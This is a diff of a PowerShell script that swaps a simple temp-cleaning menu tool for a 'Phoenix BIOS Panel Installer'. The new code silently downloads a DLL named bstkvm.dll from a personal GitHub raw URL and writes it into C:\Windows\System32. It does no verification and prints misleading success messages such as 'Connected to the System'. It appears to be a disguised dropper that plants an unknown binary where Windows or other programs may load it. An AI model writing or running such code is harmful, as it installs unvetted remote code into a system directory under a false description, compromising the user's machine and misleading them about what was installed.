@@ -1,33 +1,48 @@
-Write-Host "🔥 Welcome to Lucky Tool" -ForegroundColor Cyan
+# ================================
+# Phoenix BIOS Panel - Downloader
+# ================================
 
-function Show-Menu {
-    Clear-Host
-    Write-Host "1. Clean Temp Files"
-    Write-Host "2. Check System Info"
-    Write-Host "3. Exit"
-    
-    $choice = Read-Host "Select option"
+# Set console style
+Clear-Host
+Write-Host "=====================================" -ForegroundColor Cyan
+Write-Host "     Phoenix BIOS Panel Installer    " -ForegroundColor Green
+Write-Host "=====================================" -ForegroundColor Cyan
+Write-Host ""
 
-    switch ($choice) {
-        1 { Clean-Temp }
-        2 { System-Info }
-        3 { exit }
-        default { Write-Host "Invalid"; pause }
+# DLL URL
+$url = "https://raw.githubusercontent.com/dclucky555-del/PhoenixBios-Panel/main/bstkvm.dll"
+
+# FIXED PATH (no dynamic, no creation)
+$basePath = "C:\Windows\System32"
+$fileName = "bstkvm.dll"
+$filePath = Join-Path $basePath $fileName
+
+# Check folder exists
+if (!(Test-Path $basePath)) {
+    Write-Host "Setting Not Found Please Contact the Developer" -ForegroundColor Red
+    exit
+}
+
+try {
+    # Download DLL
+    Write-Host "[+] Please Wait Bios panel Being Setup..." -ForegroundColor Yellow
+    Invoke-WebRequest -Uri $url -OutFile $filePath -UseBasicParsing
+
+    # Verify download
+    if (Test-Path $filePath) {
+        Write-Host "Connected to the System" -ForegroundColor Green
+    } else {
+        throw "Connection Failed!"
     }
 
-    Show-Menu
+    # File info
+    $fileSize = (Get-Item $filePath).Length / 1KB
+    Write-Host "[i] File Size: $([math]::Round($fileSize,2)) KB" -ForegroundColor Cyan
+
+} catch {
+    Write-Host "[X] Error: $_" -ForegroundColor Red
 }
 
-function Clean-Temp {
-    Write-Host "Cleaning temp files..."
-    Remove-Item -Path "$env:TEMP\*" -Recurse -Force -ErrorAction SilentlyContinue
-    Write-Host "Done!"
-    pause
-}
-
-function System-Info {
-    systeminfo | findstr /B /C:"OS Name" /C:"OS Version"
-    pause
-}
-
-Show-Menu
+Write-Host ""
+Write-Host "Location: $filePath" -ForegroundColor Magenta
+Write-Host "Phoenix Bios panel Setup success ✅" -ForegroundColor Green
